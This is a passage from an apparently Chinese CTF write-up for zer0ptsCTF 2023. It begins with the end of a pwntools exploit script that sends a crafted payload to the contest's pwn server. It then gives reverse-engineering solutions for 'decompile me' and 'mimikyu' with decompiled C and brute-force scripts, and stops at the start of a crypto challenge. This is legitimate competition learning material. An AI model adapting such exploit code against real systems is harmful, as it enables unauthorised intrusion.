</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>+=</span> <span class=s1>&#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39;</span>
</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>+=</span> <span class=s1>&#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39;</span>
</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>+=</span> <span class=s1>&#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39;</span>
</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>+=</span> <span class=s1>&#39;&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39;</span>
</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>+=</span> <span class=s1>&#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39;</span>
</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>+=</span> <span class=s1>&#39;&gt;+++++++++++++++++++++++++++++++++++++++++++++++++&#39;</span>
</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>+=</span> <span class=s1>&#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39;</span>
</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>+=</span> <span class=s1>&#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39;</span>
</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>+=</span> <span class=s1>&#39;&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39;</span>
</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>+=</span> <span class=s1>&#39;&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&#39;</span>
</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>+=</span> <span class=s1>&#39;&gt;+++++++++++++++&#39;</span>
</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>+=</span> <span class=s1>&#39;&gt;+++++&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>code</span> <span class=o>+=</span> <span class=s1>&#39;&gt;[+&#39;</span> <span class=o>+</span> <span class=s1>&#39;&gt;&#39;</span> <span class=o>*</span> <span class=mh>0xc3</span>
</span></span><span class=line><span class=cl><span class=c1># ret</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sh</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;pwn.2023.zer0pts.com&#39;</span><span class=p>,</span><span class=s1>&#39;9004&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>code</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sh</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=c1># zer0pts{Bug_0fT3n_c0M3s_fR0m_L4ck_0f_t3sT_f0r_1nv4L1d_1npuTs}</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=re>Re</h2><h3 id=decompile-me>decompile me</h3><p>hook了比较函数，把数据替换了，rc4解一下即可
<img src=/img/2023-07-15zer0ptsCTF/5.png alt=image></p><h3 id=mimikyu>mimikyu</h3><p>程序的核心是用到了libc.so.6、libgmp.so两个so库中的导出函数，寻找指定函数是用到了ResolveModuleFunction函数，其中是采用hash校验的方式获取指定函数。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kr>__int64</span> <span class=nf>ResolveModuleFunction</span><span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=n>a1</span><span class=p>,</span> <span class=kt>int</span> <span class=n>a2</span><span class=p>,</span> <span class=p>...)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kr>__int64</span> <span class=n>v2</span><span class=p>;</span> <span class=c1>// rax
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kr>__int64</span> <span class=o>*</span><span class=n>overflow_arg_area</span><span class=p>;</span> <span class=c1>// rax
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v5</span><span class=p>;</span> <span class=c1>// [rsp+18h] [rbp-158h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>j</span><span class=p>;</span> <span class=c1>// [rsp+1Ch] [rbp-154h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>k</span><span class=p>;</span> <span class=c1>// [rsp+20h] [rbp-150h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v8</span><span class=p>;</span> <span class=c1>// [rsp+24h] [rbp-14Ch]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kr>__int64</span> <span class=n>v9</span><span class=p>;</span> <span class=c1>// [rsp+28h] [rbp-148h] BYREF
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kr>__int64</span> <span class=n>v10</span><span class=p>;</span> <span class=c1>// [rsp+30h] [rbp-140h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kr>__int64</span> <span class=n>v11</span><span class=p>;</span> <span class=c1>// [rsp+38h] [rbp-138h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kr>__int64</span> <span class=n>v12</span><span class=p>;</span> <span class=c1>// [rsp+40h] [rbp-130h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kr>__int64</span> <span class=o>*</span><span class=n>i</span><span class=p>;</span> <span class=c1>// [rsp+48h] [rbp-128h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=o>*</span><span class=n>v14</span><span class=p>;</span> <span class=c1>// [rsp+50h] [rbp-120h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>char</span> <span class=o>*</span><span class=n>name</span><span class=p>;</span> <span class=c1>// [rsp+58h] [rbp-118h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kr>__int64</span> <span class=p>(</span><span class=kr>__fastcall</span> <span class=o>*</span><span class=n>v16</span><span class=p>)(</span><span class=kr>__int64</span><span class=p>,</span> <span class=kr>__int64</span><span class=p>,</span> <span class=kr>__int64</span><span class=p>,</span> <span class=kr>__int64</span><span class=p>,</span> <span class=kr>__int64</span><span class=p>,</span> <span class=kr>__int64</span><span class=p>);</span> <span class=c1>// [rsp+60h] [rbp-110h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>gcc_va_list</span> <span class=n>va</span><span class=p>;</span> <span class=c1>// [rsp+68h] [rbp-108h] BYREF
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kr>__int64</span> <span class=n>v18</span><span class=p>[</span><span class=mi>8</span><span class=p>];</span> <span class=c1>// [rsp+80h] [rbp-F0h]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=nf>va_start</span><span class=p>(</span><span class=n>va</span><span class=p>,</span> <span class=n>a2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>v18</span><span class=p>[</span><span class=mi>7</span><span class=p>]</span> <span class=o>=</span> <span class=nf>__readfsqword</span><span class=p>(</span><span class=mh>0x28u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>v9</span> <span class=o>=</span> <span class=mi>0LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v12</span> <span class=o>=</span> <span class=mi>0LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)</span><span class=nf>GetModuleInformation</span><span class=p>(</span><span class=n>a1</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>v9</span><span class=p>)</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nf>__assert_fail</span><span class=p>(</span><span class=s>&#34;GetModuleInformation(hModule, &amp;lpmodinfo)&#34;</span><span class=p>,</span> <span class=s>&#34;obfuscate.h&#34;</span><span class=p>,</span> <span class=mh>0x71u</span><span class=p>,</span> <span class=s>&#34;ResolveModuleFunction&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>for</span> <span class=p>(</span> <span class=n>i</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=kr>__int64</span> <span class=o>**</span><span class=p>)(</span><span class=n>v9</span> <span class=o>+</span> <span class=mi>16</span><span class=p>);</span> <span class=o>*</span><span class=n>i</span><span class=p>;</span> <span class=n>i</span> <span class=o>+=</span> <span class=mi>2</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>v2</span> <span class=o>=</span> <span class=o>*</span><span class=n>i</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=o>*</span><span class=n>i</span> <span class=o>==</span> <span class=mi>11</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>v5</span> <span class=o>=</span> <span class=n>i</span><span class=p>[</span><span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span> <span class=k>if</span> <span class=p>(</span> <span class=n>v2</span> <span class=o>&lt;=</span> <span class=mi>11</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span> <span class=n>v2</span> <span class=o>==</span> <span class=mi>5</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>v11</span> <span class=o>=</span> <span class=n>i</span><span class=p>[</span><span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>      <span class=k>else</span> <span class=k>if</span> <span class=p>(</span> <span class=n>v2</span> <span class=o>==</span> <span class=mi>6</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>v10</span> <span class=o>=</span> <span class=n>i</span><span class=p>[</span><span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=nf>dlerror</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=n>v8</span> <span class=o>=</span> <span class=n>v11</span> <span class=o>-</span> <span class=n>v10</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>for</span> <span class=p>(</span> <span class=n>j</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>j</span> <span class=o>&lt;</span> <span class=n>v8</span> <span class=o>/</span> <span class=n>v5</span><span class=p>;</span> <span class=o>++</span><span class=n>j</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>v14</span> <span class=o>=</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span> <span class=o>*</span><span class=p>)(</span><span class=mi>24LL</span> <span class=o>*</span> <span class=n>j</span> <span class=o>+</span> <span class=n>v10</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=p>(</span><span class=n>v14</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>&amp;</span> <span class=mh>0xF</span><span class=p>)</span> <span class=o>==</span> <span class=mi>2</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>name</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)(</span><span class=o>*</span><span class=n>v14</span> <span class=o>+</span> <span class=n>v11</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span> <span class=n>a2</span> <span class=o>==</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)</span><span class=nf>CryptGetHashParam</span><span class=p>(</span><span class=n>name</span><span class=p>)</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>v16</span> <span class=o>=</span> <span class=p>(</span><span class=kr>__int64</span> <span class=p>(</span><span class=kr>__fastcall</span> <span class=o>*</span><span class=p>)(</span><span class=kr>__int64</span><span class=p>,</span> <span class=kr>__int64</span><span class=p>,</span> <span class=kr>__int64</span><span class=p>,</span> <span class=kr>__int64</span><span class=p>,</span> <span class=kr>__int64</span><span class=p>,</span> <span class=kr>__int64</span><span class=p>))</span><span class=nf>dlsym</span><span class=p>(</span><span class=n>a1</span><span class=p>,</span> <span class=n>name</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span> <span class=nf>dlerror</span><span class=p>()</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>          <span class=nf>BUG</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span> <span class=n>k</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>k</span> <span class=o>&lt;=</span> <span class=mi>5</span><span class=p>;</span> <span class=o>++</span><span class=n>k</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>          <span class=k>if</span> <span class=p>(</span> <span class=n>va</span><span class=p>[</span><span class=mi>0</span><span class=p>].</span><span class=n>gp_offset</span> <span class=o>&gt;</span> <span class=mh>0x2F</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>          <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>overflow_arg_area</span> <span class=o>=</span> <span class=p>(</span><span class=kr>__int64</span> <span class=o>*</span><span class=p>)</span><span class=n>va</span><span class=p>[</span><span class=mi>0</span><span class=p>].</span><span class=n>overflow_arg_area</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=n>va</span><span class=p>[</span><span class=mi>0</span><span class=p>].</span><span class=n>overflow_arg_area</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>va</span><span class=p>[</span><span class=mi>0</span><span class=p>].</span><span class=n>overflow_arg_area</span> <span class=o>+</span> <span class=mi>8</span><span class=p>;</span>
</span></span><span class=line><span class=cl>          <span class=p>}</span>
</span></span><span class=line><span class=cl>          <span class=k>else</span>
</span></span><span class=line><span class=cl>          <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>overflow_arg_area</span> <span class=o>=</span> <span class=p>(</span><span class=kr>__int64</span> <span class=o>*</span><span class=p>)((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>va</span><span class=p>[</span><span class=mi>0</span><span class=p>].</span><span class=n>reg_save_area</span> <span class=o>+</span> <span class=n>va</span><span class=p>[</span><span class=mi>0</span><span class=p>].</span><span class=n>gp_offset</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=n>va</span><span class=p>[</span><span class=mi>0</span><span class=p>].</span><span class=n>gp_offset</span> <span class=o>+=</span> <span class=mi>8</span><span class=p>;</span>
</span></span><span class=line><span class=cl>          <span class=p>}</span>
</span></span><span class=line><span class=cl>          <span class=n>v18</span><span class=p>[</span><span class=n>k</span><span class=p>]</span> <span class=o>=</span> <span class=o>*</span><span class=n>overflow_arg_area</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nf>v16</span><span class=p>(</span><span class=n>v18</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>v18</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=n>v18</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span> <span class=n>v18</span><span class=p>[</span><span class=mi>3</span><span class=p>],</span> <span class=n>v18</span><span class=p>[</span><span class=mi>4</span><span class=p>],</span> <span class=n>v18</span><span class=p>[</span><span class=mi>5</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>v12</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>首先是定义三个大数空间与初始化随机数种子</p><p><img src=/img/2023-07-15zer0ptsCTF/image-20230715175448547.png alt=image-20230715175448547></p><p>接着判断是输入字符是否是可打印字符</p><p><img src=/img/2023-07-15zer0ptsCTF/image-20230715175543105.png alt=image-20230715175543105></p><p>然后是获取随机数，并以此使用__gmpz的计算函数计算出两个结果v14，v13，最后将输入以4字节为一组与得到的两个结果进行pow运算，最后与指定密文对比。</p><p>因为是指定的确切的随机数种子，所以这个随机数每次都是确定的，另外程序中计算v14、v13的过程稍显复杂，直接调试得到10组v14与v13</p><p><img src=/img/2023-07-15zer0ptsCTF/image-20230715180244008.png alt=image-20230715180244008></p><p><img src=/img/2023-07-15zer0ptsCTF/image-20230715180226860.png alt=image-20230715180226860></p><p>得到密文与10组v14与v13后便考虑开始解密了，其实程序用到的就是10组rsa加密，但这个n都不能直接分解为2个质数，</p><p><img src=/img/2023-07-15zer0ptsCTF/image-20230715180106052.png alt=image-20230715180106052></p><p>因此考虑爆破。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>enc</span> <span class=o>=</span> <span class=p>[</span><span class=mh>0x00000FE4C025C5F4</span><span class=p>,</span> <span class=mh>0x00001B792FF17E8A</span><span class=p>,</span> <span class=mh>0x00000183B156AB40</span><span class=p>,</span> <span class=mh>0x00000BEFFCF5E5DA</span><span class=p>,</span> <span class=mh>0x00000297CF86E251</span><span class=p>,</span> <span class=mh>0x00000EB3EDC1D4B4</span><span class=p>,</span> <span class=mh>0x000000FA10CE3A08</span><span class=p>,</span> <span class=mh>0x0000002BDD418672</span><span class=p>,</span> <span class=mh>0x00005EBB5050EA46</span><span class=p>,</span> <span class=mh>0x000005BF9B73CF86</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>v14</span> <span class=o>=</span> <span class=p>[</span><span class=mi>61651</span><span class=p>,</span> <span class=mi>2143</span><span class=p>,</span> <span class=mi>36451</span><span class=p>,</span> <span class=mi>33353</span><span class=p>,</span> <span class=mi>50849</span><span class=p>,</span> <span class=mi>3181</span><span class=p>,</span> <span class=mi>44789</span><span class=p>,</span> <span class=mi>54751</span><span class=p>,</span> <span class=mi>59021</span><span class=p>,</span> <span class=mi>62459</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>v13</span> <span class=o>=</span> <span class=p>[</span><span class=mi>38830568246783</span><span class=p>,</span> <span class=mi>55875622227251</span><span class=p>,</span> <span class=mi>3875886538523</span><span class=p>,</span> <span class=mi>18342125763727</span><span class=p>,</span> <span class=mi>10828735575677</span><span class=p>,</span> <span class=mi>32860319419313</span><span class=p>,</span> <span class=mi>17866096656883</span><span class=p>,</span> <span class=mi>1211339173321</span><span class=p>,</span> <span class=mi>105059744341817</span><span class=p>,</span> <span class=mi>76627821322477</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>z</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>10</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x7f</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x7f</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>k</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x7f</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=k>for</span> <span class=n>l</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x7f</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                    <span class=n>m</span> <span class=o>=</span> <span class=nb>int</span><span class=o>.</span><span class=n>from_bytes</span><span class=p>([</span><span class=n>i</span><span class=p>,</span> <span class=n>j</span><span class=p>,</span> <span class=n>k</span><span class=p>,</span> <span class=n>l</span><span class=p>],</span> <span class=s2>&#34;little&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=k>if</span><span class=p>(</span><span class=nb>pow</span><span class=p>(</span><span class=n>m</span><span class=p>,</span> <span class=n>v14</span><span class=p>[</span><span class=n>z</span><span class=p>],</span> <span class=n>v13</span><span class=p>[</span><span class=n>z</span><span class=p>])</span> <span class=o>==</span> <span class=n>enc</span><span class=p>[</span><span class=n>z</span><span class=p>]):</span>
</span></span><span class=line><span class=cl>                        <span class=nb>print</span><span class=p>(</span><span class=nb>bytes</span><span class=p>([</span><span class=n>i</span><span class=p>,</span> <span class=n>j</span><span class=p>,</span> <span class=n>k</span><span class=p>,</span> <span class=n>l</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>                    
</span></span></code></pre></td></tr></table></div></div><p>但是这样很慢，但可以将其拆成10组分别爆破，相当于手动实现了多进程爆破。</p><p>比如爆破第二组：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>enc</span> <span class=o>=</span> <span class=p>[</span><span class=mh>0x00000FE4C025C5F4</span><span class=p>,</span> <span class=mh>0x00001B792FF17E8A</span><span class=p>,</span> <span class=mh>0x00000183B156AB40</span><span class=p>,</span> <span class=mh>0x00000BEFFCF5E5DA</span><span class=p>,</span> <span class=mh>0x00000297CF86E251</span><span class=p>,</span> <span class=mh>0x00000EB3EDC1D4B4</span><span class=p>,</span> <span class=mh>0x000000FA10CE3A08</span><span class=p>,</span> <span class=mh>0x0000002BDD418672</span><span class=p>,</span> <span class=mh>0x00005EBB5050EA46</span><span class=p>,</span> <span class=mh>0x000005BF9B73CF86</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x7f</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x7f</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>k</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x7f</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>l</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x7f</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=n>m</span> <span class=o>=</span> <span class=nb>int</span><span class=o>.</span><span class=n>from_bytes</span><span class=p>([</span><span class=n>i</span><span class=p>,</span> <span class=n>j</span><span class=p>,</span> <span class=n>k</span><span class=p>,</span> <span class=n>l</span><span class=p>],</span> <span class=s2>&#34;little&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span><span class=p>(</span><span class=nb>pow</span><span class=p>(</span><span class=n>m</span><span class=p>,</span> <span class=mi>2143</span><span class=p>,</span> <span class=mi>55875622227251</span><span class=p>)</span> <span class=o>==</span> <span class=mh>0x00001B792FF17E8A</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;2: &#34;</span><span class=p>,</span> <span class=nb>bytes</span><span class=p>([</span><span class=n>i</span><span class=p>,</span> <span class=n>j</span><span class=p>,</span> <span class=n>k</span><span class=p>,</span> <span class=n>l</span><span class=p>]))</span>
</span></span></code></pre></td></tr></table></div></div><p>结果：</p><p><img src=/img/2023-07-15zer0ptsCTF/image-20230715180812903.png alt=image-20230715180812903></p><p>最后所有结果拼接起来</p><p><strong>zer0pts{L00k_th3_1nt3rn4l_0f_l1br4r13s!}</strong></p><h2 id=cry>Cry</h2><h3 id=easy_factoring>easy_factoring</h3><p>关系是N = pow(p, 2) + pow(q, 2)，类似CCTF2022的SOT。
<img src=/img/2023-07-15zer0ptsCTF/6.png alt=image></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=o>*</span>
